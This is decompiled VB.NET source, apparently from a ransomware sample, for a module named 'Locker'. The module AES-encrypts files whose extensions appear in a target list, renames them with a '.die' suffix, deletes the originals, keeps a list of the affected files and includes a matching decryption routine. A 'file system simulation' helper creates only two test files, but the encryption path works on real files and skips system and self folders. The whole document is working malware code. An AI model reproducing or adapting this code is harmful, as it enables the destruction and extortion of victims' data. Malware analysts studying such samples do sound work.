Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Linq
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x02000040 RID: 64
	Friend Module Locker
		' Token: 0x0600015B RID: 347 RVA: 0x0000C4FC File Offset: 0x0000A6FC
		Friend Sub EncryptFileSystem()
			Try
				Dim hashSet As HashSet(Of String) = New HashSet(Of String)(Locker.GetExtensionsToEncrypt())
				Dim text As String = Locker.CreateFileSystemSimulation()
				Locker.EncryptFiles(text, Locker.EncryptionFileExtension, hashSet)
				Thread.Sleep(10000)
				If Not File.Exists(Locker.EncryptedFileListPath) Then
					Dim array As String() = Locker.EncryptedFiles.ToArray()
					File.WriteAllLines(Locker.EncryptedFileListPath, array)
				End If
			Catch
			End Try
		End Sub

		' Token: 0x0600015C RID: 348 RVA: 0x0000C56C File Offset: 0x0000A76C
		Friend Function GetEncryptedFiles() As HashSet(Of String)
			Dim hashSet As HashSet(Of String) = New HashSet(Of String)()
			If File.Exists(Locker.EncryptedFileListPath) Then
				For Each text As String In File.ReadAllLines(Locker.EncryptedFileListPath)
					hashSet.Add(text)
				Next
			End If
			Return hashSet
		End Function

		' Token: 0x0600015D RID: 349 RVA: 0x0000C5B8 File Offset: 0x0000A7B8
		Private Function CreateFileSystemSimulation() As String
			Dim text As String = Path.Combine(Config.WorkFolderPath, "FileSystemSimulation")
			If Not Directory.Exists(text) Then
				Directory.CreateDirectory(text)
			End If
			Using textWriter As TextWriter = New StreamWriter(Path.Combine(text, "TxtTest.txt"), True)
				textWriter.WriteLine("I am a txt test.")
			End Using
			Using textWriter2 As TextWriter = New StreamWriter(Path.Combine(text, "NotTxtTest.nottxt"), True)
				textWriter2.WriteLine("I am NOT a txt test.")
			End Using
			Return text
		End Function

		' Token: 0x0600015E RID: 350 RVA: 0x0000C65C File Offset: 0x0000A85C
		Private Function GetExtensionsToEncrypt() As IEnumerable(Of String)
			Dim hashSet As HashSet(Of String) = New HashSet(Of String)()
			For Each text As String In Resources.ExtensionsToEncrypt.Split(New String() { Environment.NewLine, " " }, StringSplitOptions.RemoveEmptyEntries).ToList()
				hashSet.Add(text.Trim())
			Next
			hashSet.Remove(Locker.EncryptionFileExtension)
			Return hashSet
		End Function

		' Token: 0x0600015F RID: 351 RVA: 0x00002857 File Offset: 0x00000A57
		Private Function GetFiles(path As String) As IEnumerable(Of String)
			Dim <GetFiles>d__ As Locker.<GetFiles>d__8 = New Locker.<GetFiles>d__8(-2)
			<GetFiles>d__.<>3__path = path
			Return <GetFiles>d__
		End Function

		' Token: 0x06000160 RID: 352 RVA: 0x0000C6EC File Offset: 0x0000A8EC
		Private Sub EncryptFiles(dirPath As String, encryptionExtension As String, extensionsToEncrypt As HashSet(Of String))
			Dim CS$<>8__locals1 As Locker.<>c__DisplayClass9_0 = New Locker.<>c__DisplayClass9_0()
			CS$<>8__locals1.extensionsToEncrypt = extensionsToEncrypt
			Dim files As IEnumerable(Of String) = Locker.GetFiles(dirPath)
			Dim <>9__ As Func(Of String, IEnumerable(Of String)) = CS$<>8__locals1.<>9__0
			Dim func As Func(Of String, IEnumerable(Of String)) = <>9__
			If <>9__ Is Nothing Then
				Dim CS$<>8__locals2 As Locker.<>c__DisplayClass9_0 = CS$<>8__locals1
				Dim func2 As Func(Of String, IEnumerable(Of String)) = Function(file As String) CS$<>8__locals1.extensionsToEncrypt
				Dim func3 As Func(Of String, IEnumerable(Of String)) = func2
				CS$<>8__locals2.<>9__0 = func2
				func = func3
			End If
			Dim <>9__9_ As var = Locker.<>c.<>9__9_1
			Dim func4 As var = <>9__9_
			If <>9__9_ Is Nothing Then
				Dim func5 As var = Function(file As String, ext As String) New With{ file, ext }
				func4 = func5
				Locker.<>c.<>9__9_1 = func5
			End If
			Dim enumerable As var = files.SelectMany(func, func4)
			Dim <>9__9_2 As var = Locker.<>c.<>9__9_2
			Dim func6 As var = <>9__9_2
			If <>9__9_2 Is Nothing Then
				Dim func7 As var = Function(<>h__TransparentIdentifier0) <>h__TransparentIdentifier0.file.EndsWith(<>h__TransparentIdentifier0.ext)
				func6 = func7
				Locker.<>c.<>9__9_2 = func7
			End If
			Dim enumerable2 As var = enumerable.Where(func6)
			Dim <>9__9_3 As var = Locker.<>c.<>9__9_3
			Dim func8 As var = <>9__9_3
			If <>9__9_3 Is Nothing Then
				Dim func9 As var = Function(<>h__TransparentIdentifier0) <>h__TransparentIdentifier0.file
				func8 = func9
				Locker.<>c.<>9__9_3 = func9
			End If
			Dim enumerable3 As IEnumerable(Of String) = enumerable2.[Select](func8)
			Dim <>9__9_4 As var = Locker.<>c.<>9__9_4
			Dim func10 As var = <>9__9_4
			If <>9__9_4 Is Nothing Then
				Dim func11 As var = Function(file As String) New With{ Key .file = file, Key .fi = New FileInfo(file) }
				func10 = func11
				Locker.<>c.<>9__9_4 = func11
			End If
			Dim enumerable4 As var = enumerable3.[Select](func10)
			Dim <>9__9_5 As var = Locker.<>c.<>9__9_5
			Dim func12 As var = <>9__9_5
			If <>9__9_5 Is Nothing Then
				Dim func13 As var = Function(t) t.fi.Length < 10000000L
				func12 = func13
				Locker.<>c.<>9__9_5 = func13
			End If
			Dim enumerable5 As var = enumerable4.Where(func12)
			Dim <>9__9_6 As var = Locker.<>c.<>9__9_6
			Dim func14 As var = <>9__9_6
			If <>9__9_6 Is Nothing Then
				Dim func15 As var = Function(t) t.file
				func14 = func15
				Locker.<>c.<>9__9_6 = func15
			End If
			For Each text As String In enumerable5.[Select](func14)
				Try
					If Path.GetDirectoryName(Application.ExecutablePath) <> Path.GetDirectoryName(Config.FinalExePath) AndAlso Path.GetDirectoryName(Application.ExecutablePath) <> Path.GetDirectoryName(Config.TempExePath) AndAlso Locker.EncryptFile(text, encryptionExtension) Then
						Locker.EncryptedFiles.Add(text)
					End If
				Catch
				End Try
			Next
		End Sub

		' Token: 0x06000161 RID: 353 RVA: 0x0000C898 File Offset: 0x0000AA98
		Friend Sub DecryptFiles(encryptionExtension As String)
			For Each text As String In Locker.GetEncryptedFiles()
				Try
					Dim text2 As String = text + encryptionExtension
					If Path.GetDirectoryName(Application.ExecutablePath) <> Path.GetDirectoryName(Config.FinalExePath) AndAlso Path.GetDirectoryName(Application.ExecutablePath) <> Path.GetDirectoryName(Config.TempExePath) Then
						Locker.DecryptFile(text2, encryptionExtension)
						File.Delete(text2)
					End If
				Catch
				End Try
			Next
			File.Delete(Locker.EncryptedFileListPath)
		End Sub

		' Token: 0x06000162 RID: 354 RVA: 0x0000C950 File Offset: 0x0000AB50
		Private Function EncryptFile(path As String, encryptionExtension As String) As Boolean
			Try
				If Config.StartMode > Config.StartModeType.Debug AndAlso (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) OrElse path.StartsWith("C:\Windows", StringComparison.InvariantCultureIgnoreCase)) Then
					Return False
				End If
				Using aesCryptoServiceProvider As AesCryptoServiceProvider = New AesCryptoServiceProvider()
					Dim bytes As Byte() = Encoding.UTF8.GetBytes(Locker.EncryptionPassword)
					Dim text As String = Convert.ToBase64String(bytes)
					aesCryptoServiceProvider.KeySize = 256
					aesCryptoServiceProvider.Key = Convert.FromBase64String(text)
					aesCryptoServiceProvider.IV = New Byte() { 0, 2, 0, 4, 5, 3, 0, 8, 0, 0, 2, 0, 6, 6, 6, 5 }
					Locker.EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension)
				End Using
			Catch
				Return False
			End Try
			Try
				File.Delete(path)
			Catch ex As Exception
				Return False
			End Try
			Return True
		End Function

		' Token: 0x06000163 RID: 355 RVA: 0x0000CA38 File Offset: 0x0000AC38
		Private Sub DecryptFile(path As String, encryptionExtension As String)
			Try
				If Not path.EndsWith(encryptionExtension) Then
					Return
				End If
				Dim text As String = path.Remove(path.Length - 4)
				Using aesCryptoServiceProvider As AesCryptoServiceProvider = New AesCryptoServiceProvider()
					Dim bytes As Byte() = Encoding.UTF8.GetBytes(Locker.EncryptionPassword)
					Dim text2 As String = Convert.ToBase64String(bytes)
					aesCryptoServiceProvider.KeySize = 256
					aesCryptoServiceProvider.Key = Convert.FromBase64String(text2)
					aesCryptoServiceProvider.IV = New Byte() { 0, 2, 0, 4, 5, 3, 0, 8, 0, 0, 2, 0, 6, 6, 6, 5 }
					Locker.DecryptFile(aesCryptoServiceProvider, path, text)
				End Using
			Catch
				Return
			End Try
			Try
				File.Delete(path)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000164 RID: 356 RVA: 0x0000CB04 File Offset: 0x0000AD04
		Private Sub EncryptFile(alg As SymmetricAlgorithm, inputFile As String, outputFile As String)
			Dim array As Byte() = New Byte(65535) {}
			Using fileStream As FileStream = New FileStream(inputFile, FileMode.Open)
				Using fileStream2 As FileStream = New FileStream(outputFile, FileMode.Create)
					Using cryptoStream As CryptoStream = New CryptoStream(fileStream2, alg.CreateEncryptor(), CryptoStreamMode.Write)
						Dim num As Integer
						Do
							num = fileStream.Read(array, 0, array.Length)
							If num <> 0 Then
								cryptoStream.Write(array, 0, num)
							End If
						Loop While num <> 0
					End Using
				End Using
			End Using
		End Sub

		' Token: 0x06000165 RID: 357 RVA: 0x0000CBB4 File Offset: 0x0000ADB4
		Private Sub DecryptFile(alg As SymmetricAlgorithm, inputFile As String, outputFile As String)
			Dim array As Byte() = New Byte(65535) {}
			Using fileStream As FileStream = New FileStream(inputFile, FileMode.Open)
				Using fileStream2 As FileStream = New FileStream(outputFile, FileMode.Create)
					Using cryptoStream As CryptoStream = New CryptoStream(fileStream2, alg.CreateDecryptor(), CryptoStreamMode.Write)
						Dim num As Integer
						Do
							num = fileStream.Read(array, 0, array.Length)
							If num <> 0 Then
								cryptoStream.Write(array, 0, num)
							End If
						Loop While num <> 0
					End Using
				End Using
			End Using
		End Sub

		' Token: 0x04000113 RID: 275
		Private EncryptionFileExtension As String = ".die"

		' Token: 0x04000114 RID: 276
		Private EncryptionPassword As String = Config.EncryptionPassword

		' Token: 0x04000115 RID: 277
		Private EncryptedFileListPath As String = Path.Combine(Config.WorkFolderPath, "EncryptedFileList.txt")

		' Token: 0x04000116 RID: 278
		Private EncryptedFiles As HashSet(Of String) = New HashSet(Of String)()
	End Module
End Namespace
